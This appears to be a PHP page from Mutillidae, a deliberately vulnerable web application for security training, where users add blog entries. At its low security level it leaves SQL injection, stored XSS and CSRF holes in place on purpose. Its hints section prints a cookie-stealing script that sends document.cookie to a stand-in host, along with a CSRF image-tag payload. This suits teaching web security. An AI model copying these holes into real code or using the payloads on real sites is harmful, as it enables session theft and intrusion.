
<?php
	/* Known Vulnerabilities: 
		SQL injection, 
		Cross Site Scripting, 
		Cross Site Request Forgery,
		Application Exception Output,
		Known Vulnerable Output: Name, Comment, "Add blog for" title,
		HTML injection
	*/
	/* Defined our constants to use to tokenize allowed HTML characters */
	include_once './includes/constants.php';
		
	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   			// DO NOTHING: This is insecure		
			$lEncodeOutput = FALSE;
			$lLoggedInUser = $logged_in_user;
			$lTokenizeAllowedMarkup = FALSE;
			$lProtectAgainstSQLInjection = FALSE;
		break;
	    		
   		case "5": // This code is fairly secure
  			/* 
  			 * NOTE: Input validation is excellent but not enough. The output must be
  			 * encoded per context. For example, if output is placed in HTML,
  			 * then HTML encode it. Blacklisting is a losing proposition. You 
  			 * cannot blacklist everything. The business requirements will usually
  			 * require allowing dangerous charaters. In the example here, we can 
  			 * validate username but we have to allow special characters in passwords
  			 * least we force weak passwords. We cannot validate the signature hardly 
  			 * at all. The business requirements for text fields will demand most
  			 * characters. Output encoding is the answer. Validate what you can, encode it
  			 * all.
  			 */
   			// encode the output following OWASP standards
   			// this will be HTML encoding because we are outputting data into HTML
			$lEncodeOutput = TRUE;
			
			/* Business Problem: Sometimes the business requirements define that users
			 * should be allowed to use some HTML  markup. If unneccesary, this is a
			 * bad idea. Output encoding will naturally kill any users attempt to use HTML
			 * in their input, which is exactly why we use output encoding. 
			 * 
			 * If the business process allows some HTML, then those HTML items are elevated
			 * from "mallicious input" to "direct object refernces" (a resource to be enjoyed).
			 * When we want to restrict a user to using to "direct object refernces" (a 
			 * resource to be enjoyed) responsibly, we use mapping. Mapping allows the user
			 * to chose from a "system generated" (that's us programmers) set of tokens
			 * to pick from. We need to assure that the user either chooses one of the tokens
			 * we offer, or our system rejects the request. To put it bluntly, either the user
			 * follows the rules, or their output is encoded. Period.
			 */
			$lTokenizeAllowedMarkup = TRUE;
			
			/* If we are in secure mode, we need to protect against SQLi */
			$lProtectAgainstSQLInjection = TRUE;
						
			/* Note that mysql_escape_string is ok but not the best defense. Stored
			 * Procedures are a much more powerful defense, run much faster, can be
			 * trapped in a schema, can run on the database, and can be called from
			 * any number of web applications. Stored procs are the true anti-pwn.
			 * There are 3 ways that stored procs can be made vulenrable by developers,
			 * but they are safe by default. Queries are vulnerable by default.
			 */
			$lLoggedInUser = mysql_escape_string($logged_in_user);
   		break;
   	}// end switch		


	/* Insert user's new blog entry */
	/*precondition: $logged_in_user is not null */
	if (!isSet($logged_in_user)) {
		throw new Exception("$logged_in_user is not set. Page add-to-your-blog.php requires this variable.");
	}// end if
	
	if(isSet($_POST["add-to-your-blog-php-submit-button"])){
		try {
			// Grab inputs
			// This might prevent SQL injection on the insert.
			if ($lProtectAgainstSQLInjection){
				$lBlogEntry = mysql_real_escape_string($_REQUEST["blog_entry"]);
			}else{
				$lBlogEntry = $_REQUEST["blog_entry"];
			}// end if

			/* Some dangerous markup allowed. Here we toeknize it for storage. */
			if ($lTokenizeAllowedMarkup){
				$lBlogEntry = str_ireplace('<b>', BOLD_STARTING_TAG, $lBlogEntry);
				$lBlogEntry = str_ireplace('</b>', BOLD_ENDING_TAG, $lBlogEntry);
				$lBlogEntry = str_ireplace('<i>', ITALIC_STARTING_TAG, $lBlogEntry);
				$lBlogEntry = str_ireplace('</i>', ITALIC_ENDING_TAG, $lBlogEntry);
				$lBlogEntry = str_ireplace('<u>', UNDERLINE_STARTING_TAG, $lBlogEntry);
				$lBlogEntry = str_ireplace('</u>', UNDERLINE_ENDING_TAG, $lBlogEntry);				
			}// end if $lTokenizeAllowedMarkup			
			
			// weak server-side input validation. not good enough.
			if(strlen($lBlogEntry) > 0){
				$lValidationFailed = FALSE;
				
				$query = "INSERT INTO blogs_table(blogger_name, comment, date) VALUES ('".
					$logged_in_user . "', '".
					$lBlogEntry  . "', " .
					" now() )";
			
				$result = mysql_query($query);
				
				$LogHandler->writeToLog("Blog entry added by: " . $logged_in_user);
				
			}else{
				$lValidationFailed = TRUE;
			}// end if(strlen($lBlogEntry) > 0)
		} catch (Exception $e) {
			echo $CustomErrorHandler->FormatError($e, $query);
		}// end try
	}else {
		$lValidationFailed = FALSE;
	}// end if isSet($_POST["add-to-your-blog-php-submit-button"])
?>

<script type="text/javascript">
	var onSubmitBlogEntry = function(/* HTMLForm */ theForm){
		if(theForm.blog_entry.value.search(/\'/) > -1){
			alert('Single-quotes are not allowed. Dont listen to security people. Everyone knows if we just filter dangerous characters, XSS is not possible.\n\nWe use JavaScript defenses combined with filtering technology.\n\nBoth are such great defenses that you are stopped in your tracks.');
			return false;
		}
	};// end function
</script>
<div class="page-title">Welcome To The Blog</div><br /><br />
<fieldset>
	<legend>Add New Blog Entry</legend>
	<form 	action="index.php?page=add-to-your-blog.php" 
			method="post" 
			enctype="application/x-www-form-urlencoded" 
			onsubmit="return onSubmitBlogEntry(this);"
			id="idBlogForm">
		<table style="margin-left:auto; margin-right:auto;">
			<tr id="id-bad-blog-entry-tr" style="display: none;">
				<td class="error-message">
					Validation Error: Blog entry cannot be blank
				</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td id="id-blog-form-header-td" class="form-header">Add blog for <?php echo $logged_in_user?></td>
			</tr>
			<tr><td></td></tr>
			<tr><td class="report-header">Note: &lt;b&gt; and &lt;/b&gt; are now allowed in blog entries</td></tr>
			<tr>
				<td><textarea rows="10" cols="65" name="blog_entry"></textarea></td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td style="text-align:center;">
					<input name="add-to-your-blog-php-submit-button" class="button" type="submit" value="Save Blog Entry" />
				</td>
			</tr>
			<tr><td></td></tr>
		</table>
	</form>
</fieldset>

<?php
	if ($lValidationFailed) {
		echo '<script>document.getElementById("id-bad-blog-entry-tr").style.display="";</script>'; 
	}// end if ($lValidationFailed)
?>

<?php
	/* Display current user's blog entries */
	try {
		$query  = "SELECT * FROM blogs_table WHERE
				blogger_name like '{$lLoggedInUser}%'
				ORDER BY date DESC
				LIMIT 0 , 100";
				
		$result = mysql_query($query);
		if (mysql_errno()>0) {
	    	throw (new Exception('Error: '.mysql_error($conn), mysql_errno()));
	    }// end if
				
		echo '<div>&nbsp;</div>';
		echo '<table border="1px" width="100%" class="main-table-frame">';
	    echo '<tr class="report-header"><td colspan="3">Current Blog Entries</td></tr>
	    	<tr class="report-header">
			    <td><B>Name</B></td>
			    <td><B>Date</B></td>
			    <td><B>Comment</B></td>
		    </tr>';

	    while($row = mysql_fetch_array($result, MYSQL_ASSOC)){
	    	
			if(!$lEncodeOutput){
				$lBloggerName = $row['blogger_name'];
				$lDate = $row['date'];
				$lComment = $row['comment'];
			}else{
				$lBloggerName = $Encoder->encodeForHTML($row['blogger_name']);
				$lDate = $Encoder->encodeForHTML($row['date']);
				$lComment = $Encoder->encodeForHTML($row['comment']);
			}// end if

			/* Some dangerous markup allowed. Here we restore the tokenized output. 
			 * Note that using GUIDs as tokens works well because they are 
			 * fairly unique plus they encode to the same value. 
			 * Encoding wont hurt them.
			 * 
			 * Note: Mutillidae is weird. It has to be broken and unbroken at the same time.
			 * Here we un-tokenize our output no matter if we are in secure mode or not.
			 */
			$lComment = str_ireplace(BOLD_STARTING_TAG, '<span style="font-weight:bold;">', $lComment);
			$lComment = str_ireplace(BOLD_ENDING_TAG, '</span>', $lComment);
			$lComment = str_ireplace(ITALIC_STARTING_TAG, '<span style="font-style: italic;">', $lComment);
			$lComment = str_ireplace(ITALIC_ENDING_TAG, '</span>', $lComment);
			$lComment = str_ireplace(UNDERLINE_STARTING_TAG, '<span style="border-bottom: 1px solid #000000;">', $lComment);
			$lComment = str_ireplace(UNDERLINE_ENDING_TAG, '</span>', $lComment);

			echo "<tr>
					<td>{$lBloggerName}</td>
					<td>{$lDate}</td>
					<td>{$lComment}</td>
				</tr>\n";
		}//end while $row
		echo "</TABLE>";		

	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
	}// end try	
?>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For XSS:</b>XSS is easy stuff. This one shows off 
						  		both reflected (you see the results 
								instantly) and stored (someone can run across it 
								later in another app that uses the same database). 
								"&lt;script&gt;alert("XSS");&lt;/script&gt;" is the 
								classic, but there are far more interesting things you 
								could do which I plan show in a video later.
							</li>
						  	<li>For some hot cookie stealing action, try something like:
								<pre>
								&lt;script&gt;
									new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
								&lt;/script&gt;
								</pre>	
							</li>
							<li>Check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
								for more ways you can encode XSS attacks that may 
								allow you to get around some filters.
							</li>
							<li><b>For CSRF:</b>You can create another page someplace and
							make a link to an image that is not an image. You can also
							send someone an HTML email with a link inside. Sending links over
							HTML aware Instant Messaging like Communicator also works. One of the 
							quietest methods is to use HTML injection to poison a web page thus 
							creating a persistant attack. When a user visits the poisoned page, 
							their browser will reach out to the targe page. Using an AJAX request 
							can keep the rouge tranaction silent.
							You could use something like the following:
							<br>
							&lt;img src="http://localhost/mutillidae/index.php?page=add-to-your-blog.php&input_from_form=hi%20there%20monkeyboy"&gt;
							<br>
							This is the easy way to do CSRF with the GET method. Login 
							as someone, make your page with the link image someplace else, 
							and then view it. You should now see
							something new on the comment wall.
							</li>
							<li>
								For Cross Site Request Forgery, a tool like the Social
								Engineering Toolkit by Dave Kennedy can help. 
							</li>
							<li>
								One interesting concept is injecting server side code. Talk about ownage. This
								requires very special circumstances though. Essentially you need the concept of "eval()"
								happening on the server-side. In Oracle and SQL Server this command is "EXEC". In JavaScript
								the command is "eval()". In PHP and ASP look for "include()". In ColdFusion the <cfinclude> tag 
								fulfills this purpose.
								
								Eval() is the opposite of encoding. It takes a text context and transforms text into 
								an execution context. Encoding takes potetially dangerous code that could execute and
								renders it harmless.
							</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?>

<script type="text/javascript">
	try{
		document.getElementById("idBlogForm").blog_entry.focus();
	}catch(e){
		alert('Error trying to set focus on field blog_entry: ' + e.message);
	}// end try
</script>
